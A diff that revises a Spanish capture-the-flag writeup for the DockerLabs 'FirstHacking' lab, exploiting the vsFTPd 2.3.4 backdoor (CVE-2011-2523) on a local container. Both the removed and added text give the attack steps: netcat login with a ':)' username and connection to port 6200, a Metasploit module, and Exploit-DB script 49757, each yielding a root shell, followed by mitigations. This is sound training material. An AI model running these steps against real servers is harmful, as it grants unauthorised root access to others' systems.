@@ -1,13 +1,12 @@
-
 # DockerLabs: FirstHacking — Writeup
 
 ![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20Fácil-brightgreen)
 ![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-blue)
 ![Categoría](https://img.shields.io/badge/Categoría-FTP%20%7C%20Backdoor-orange)
 
-Writeup técnico de la máquina **FirstHacking** de [DockerLabs](https://dockerlabs.es), pensado con fines educativos para practicar enumeración de servicios y explotación de vulnerabilidades conocidas.
+Writeup técnico de la máquina **FirstHacking** de [DockerLabs](https://dockerlabs.es) (autor del laboratorio: *El Pingüino de Mario*), realizado con fines educativos para practicar reconocimiento de servicios y explotación de una vulnerabilidad histórica en vsFTPd.
 
-> ⚠️ Este documento tiene fines exclusivamente formativos. Todo lo aquí descrito se realizó en un entorno controlado y aislado (contenedor Docker de DockerLabs), nunca contra sistemas de producción sin autorización.
+> ⚠️ Documento con fines exclusivamente formativos. Todo lo aquí descrito se ejecutó en un entorno controlado y aislado (contenedor de DockerLabs).
 
 ## 🗺️ Resumen general
 
@@ -16,146 +15,127 @@ Writeup técnico de la máquina **FirstHacking** de [DockerLabs](https://dockerl
 | **Entorno** | DockerLabs |
 | **Máquina** | FirstHacking |
 | **Dificultad** | Muy Fácil |
-| **Conceptos clave** | Enumeración FTP, Banner Grabbing, CVE-2011-2523, análisis de procesos |
-| **Herramientas** | Nmap, Netcat |
+| **Conceptos clave** | Reconocimiento con Nmap, CVE-2011-2523 (backdoor vsFTPd 2.3.4), Searchsploit |
+| **Herramientas** | ping, Nmap, Searchsploit, Python |
 
 ---
 
 ## Paso 00: Despliegue del entorno
 
 ```bash
-# Descomprimir la máquina descargada desde DockerLabs
 unzip firsthacking.zip
-
-# Pasar a superusuario
 sudo su
-
-# Desplegar el contenedor
 sudo ./auto_deploy.sh firsthacking.tar
 ```
 
-El script `auto_deploy.sh` automatiza la carga de la imagen Docker y el arranque del contenedor, asignándole una IP dentro de la red interna de Docker (en mi caso, `172.17.0.2`).
+El script levanta el contenedor y lo conecta a la red interna de Docker (IP de ejemplo: `172.17.0.2`).
 
 ---
 
-## 🔍 Paso 01: Reconocimiento y enumeración
+## 🔍 Paso 01: Reconocimiento inicial
 
-### Escaneo de puertos con Nmap
+### Comprobación de disponibilidad y SO
+
+Antes de escanear puertos conviene confirmar que la máquina responde y estimar el sistema operativo a partir del TTL de la respuesta ICMP:
 
 ```bash
-sudo nmap -p- --open -sS -sC -sV -min-rate 500 -n -Pn 172.17.0.2 -oG nmap_inicial.txt
+ping -c 1 172.17.0.2
 ```
 
-**Resultado:**
+Un TTL de **64** indica que el objetivo es un sistema **Linux/Unix** accesible sin saltos intermedios.
+
+### Escaneo completo de puertos TCP
+
+Primero se identifican todos los puertos abiertos con un SYN scan rápido sobre el rango completo:
+
+```bash
+sudo nmap -sS -p- --min-rate 1000 -n -Pn 172.17.0.2 -oN allPorts
+```
+
+### Enumeración de servicios sobre los puertos detectados
+
+Una vez localizados los puertos abiertos, se lanza un escaneo dirigido con detección de versión y scripts por defecto solo sobre esos puertos:
+
+```bash
+nmap -sCV -p 21 -n -Pn 172.17.0.2 -oN services
+```
+
+**Resultado relevante:**
 
 ```
-Starting Nmap 7.99 ( https://nmap.org )
-Nmap scan report for 172.17.0.2
-Host is up (0.0000050s latency).
-Not shown: 65534 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
-MAC Address: 82:42:24:11:33:8F (Unknown)
-Service Info: OS: Unix
 ```
 
-**Hallazgo:** un único puerto abierto, **21/TCP**, corriendo **vsFTPd 2.3.4**.
-
-Esa versión concreta es la señal de alarma: es la versión históricamente asociada a un backdoor muy conocido.
+**Hallazgo:** un único servicio expuesto — **FTP (vsFTPd 2.3.4)** — sobre un sistema Unix. No hay servicios UDP relevantes para este laboratorio, por lo que su escaneo se omite.
 
 ---
 
-## 🧠 Paso 02: Análisis de la vulnerabilidad
+## 🧠 Paso 02: Identificación de la vulnerabilidad
 
-**Identificador:** CVE-2011-2523
+**CVE-2011-2523**
 
-En julio de 2011 se descubrió que el paquete fuente de **vsFTPd 2.3.4** alojado en el sitio oficial había sido reemplazado por un tercero no autorizado por una versión modificada. Esa versión troyanizada contiene una puerta trasera (*backdoor*): si durante el login FTP se introduce como nombre de usuario una cadena que termine en la carita `:)` (smiley), el servicio abre una **shell de comandos en texto plano en el puerto TCP 6200**.
+La versión **vsFTPd 2.3.4** corresponde a un caso conocido de compromiso en la distribución del software: en julio de 2011 el paquete oficial fue sustituido temporalmente por una versión modificada que incluye una puerta trasera (*backdoor*). Al recibir ciertas cadenas de login, el servicio abre una **shell de comandos interactiva en el puerto TCP 6200**, sin necesidad de credenciales válidas.
 
-No se trata de un fallo de programación de vsFTPd en sí, sino de una versión maliciosa distribuida temporalmente por el sitio de descargas oficial, motivo por el que se convirtió en una de las vulnerabilidades más citadas en máquinas de nivel introductorio (Metasploitable2, HTB "Lame", etc.).
+Referencia: https://nvd.nist.gov/vuln/detail/CVE-2011-2523
+
+Dado que se trata de un servicio con versión identificada, se busca si existe un exploit público ya catalogado:
+
+```bash
+searchsploit vsftpd 2.3.4
+```
+
+Esto devuelve una entrada correspondiente al backdoor de vsFTPd 2.3.4 (Exploit-DB ID **49757**). Se copia a un directorio de trabajo local:
+
+```bash
+searchsploit -m 49757
+```
 
 ---
 
 ## 💥 Paso 03: Explotación
 
-### Opción A — Manual con Netcat
-
-1. Conectar al servicio FTP:
+El exploit `49757.py` automatiza el envío de la cadena de login que activa la puerta trasera y la posterior conexión al puerto 6200:
 
 ```bash
-nc -nv 172.17.0.2 21
+python2 49757.py 172.17.0.2
 ```
 
-2. Introducir como usuario una cadena que contenga la carita `:)` (por ejemplo `user:)` seguido de cualquier contraseña). Esto activa el backdoor internamente.
+> 💡 Este exploit concreto está escrito para Python 2. Si al ejecutarlo se produce un error o no se recibe conexión a la primera, es habitual tener que relanzarlo una o dos veces hasta que el backdoor responda correctamente.
 
-3. En otra terminal, conectar directamente al puerto que queda abierto tras el disparo:
-
-```bash
-nc -nv 172.17.0.2 6200
-```
-
-4. Si el backdoor se activó correctamente, se obtiene una shell de root sin autenticación:
+Al ejecutarse con éxito, se obtiene una shell directamente como usuario `root`:
 
 ```bash
 whoami
 # root
-id
-# uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Opción B — Con exploit automatizado (Metasploit)
-
-```bash
-msfconsole -q
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 172.17.0.2
-run
-```
-
-Metasploit automatiza los pasos anteriores: envía el nombre de usuario con la carita, espera el tiempo necesario y se conecta al puerto 6200 directamente, devolviendo una sesión de comandos.
+Como ya se dispone de acceso con el máximo privilegio, en este laboratorio **no es necesaria ninguna escalada de privilegios adicional**.
 
 ---
 
-## 🚩 Paso 04: Post-explotación y captura de la flag
 
-Una vez dentro con la shell obtenida:
+## 🛡️ Mitigaciones a aplicar
 
-```bash
-# Estabilizar la shell (opcional, si es una shell simple)
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-# Ubicar la flag
-find / -iname "*flag*" 2>/dev/null
-cat /root/flag.txt   # ruta orientativa, ajustar según lo que encuentres
-```
-
-> ✏️ **Sustituye este bloque por la ruta y el contenido real de la flag que obtuviste en tu propia ejecución** — cada despliegue de DockerLabs puede variar ligeramente.
-
-```
-[PEGAR AQUÍ LA FLAG OBTENIDA]
-```
+- Mantener los servicios expuestos actualizados a la última versión parcheada, evitando así versiones con vulnerabilidades conocidas y públicamente explotables.
+- Aplicar el principio de mínimo privilegio: exponer servicios como FTP bajo cuentas de sistema dedicadas y sin privilegios administrativos.
+- Verificar la integridad de los paquetes de software descargados (checksums/firmas) para detectar compromisos en la cadena de suministro.
+- Sustituir FTP en texto claro por alternativas cifradas (SFTP/FTPS) y restringir el acceso mediante firewall.
 
 ---
 
 ## 📌 Conclusiones
 
-- Un simple *banner grabbing* con Nmap fue suficiente para identificar una versión de software con una vulnerabilidad crítica pública y documentada.
-- El caso de vsFTPd 2.3.4 recuerda la importancia de **verificar la integridad de los paquetes descargados** (checksums, firmas GPG) ante posibles compromisos en la cadena de suministro de software.
-- Mantener los servicios actualizados y monitorizar versiones expuestas es una medida de mitigación básica pero esencial.
-
-## 🛡️ Mitigación
-
-- Actualizar a una versión de vsFTPd posterior y verificada oficialmente.
-- Restringir el acceso FTP mediante firewall a IPs de confianza.
-- Sustituir FTP en texto plano por SFTP/FTPS.
-- Monitorizar procesos y puertos inusuales (como el 6200) mediante IDS/IPS.
+Este laboratorio ilustra cómo una simple identificación de versión de servicio durante la fase de enumeración puede conducir directamente a una vulnerabilidad crítica documentada, sin necesidad de técnicas avanzadas: el reconocimiento cuidadoso es, muchas veces, el paso decisivo de todo el ejercicio.
 
 ---
 
 ## 📚 Referencias
 
 - [CVE-2011-2523 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
+- [Exploit-DB 49757 — vsftpd 2.3.4 Backdoor Command Execution](https://www.exploit-db.com/exploits/49757)
 - [DockerLabs](https://dockerlabs.es)
-- [Exploit-DB — vsftpd 2.3.4 Backdoor Command Execution](https://www.exploit-db.com/exploits/49757)
+- Metodología de referencia: David Prieto Montero (Pyth0nK1d), *"DockerLabs Writeup — FirstHacking (Spanish)"*, Medium.
 
 ---
 
